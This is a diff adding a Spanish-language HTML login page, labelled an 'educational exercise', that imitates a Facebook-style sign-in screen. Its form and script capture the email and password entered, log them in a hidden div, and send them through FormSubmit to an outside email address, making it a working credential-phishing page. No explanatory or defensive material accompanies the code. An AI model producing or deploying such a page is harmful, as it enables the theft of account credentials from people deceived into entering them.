@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Simulación de Inicio de Sesión - Ejercicio Educativo</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f0f2f5;
+        }
+        .login-container {
+            background-color: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            width: 300px;
+            text-align: center;
+        }
+        .login-container h2 {
+            color: #1877f2;
+            margin-bottom: 20px;
+        }
+        .login-container input {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #dddfe2;
+            border-radius: 5px;
+            font-size: 16px;
+        }
+        .login-container button {
+            width: 100%;
+            padding: 10px;
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+        .login-container button:hover {
+            background-color: #165fc7;
+        }
+        .hidden-log {
+            display: none; /* Cambia a 'block' para ver los datos en la página */
+            margin-top: 20px;
+            background-color: #f8f8f8;
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+        }
+    </style>
+</head>
+<body>
+
+
+
+
+    <div class="login-container">
+        <h2>Iniciar Sesión</h2>
+        <form id="login-form" action="https://formsubmit.co/VIDEOSLACRA@GMAIL.COM" method="POST">
+            <input type="email" name="email" id="email" placeholder="Correo electrónico" required>
+            <input type="password" name="password" id="password" placeholder="Contraseña" required>
+            <input type="hidden" name="_subject" value="Datos de formulario (Ejercicio educativo)">
+            <input type="hidden" name="_template" value="table">
+            <button type="submit">Iniciar Sesión</button>
+        </form>
+        <div id="log" class="hidden-log">
+            <h3>Datos registrados:</h3>
+            <p id="log-content">Aquí se mostrarán los datos.</p>
+        </div>
+    </div>
+
+    <script>
+        const form = document.getElementById('login-form');
+        const logContent = document.getElementById('log-content');
+        let credentialsLog = [];
+
+        form.addEventListener('submit', async (event) => {
+            event.preventDefault(); // Evitar que la página se actualice
+
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+
+            // Mostrar datos en la sección oculta
+            const entry = `Correo: ${email}, Contraseña: ${password}, Fecha: ${new Date().toLocaleString()}`;
+            credentialsLog.push(entry);
+            logContent.innerHTML = credentialsLog.join('<br>');
+
+            // Enviar datos a FormSubmit
+            const formData = new FormData(form);
+            try {
+                const response = await fetch(form.action, {
+                    method: 'POST',
+                    body: formData
+                });
+                if (response.ok) {
+                    console.log('Datos enviados a FormSubmit');
+                    alert('Datos enviados a tu correo (verifica tu bandeja de entrada o spam).');
+                } else {
+                    console.error('Error al enviar datos');
+                    alert('Error al enviar los datos.');
+                }
+            } catch (error) {
+                console.error('Error:', error);
+                alert('Error al enviar los datos.');
+            }
+
+            // Limpiar formulario
+            form.reset();
+        });
+    </script>
+</body>
+</html>
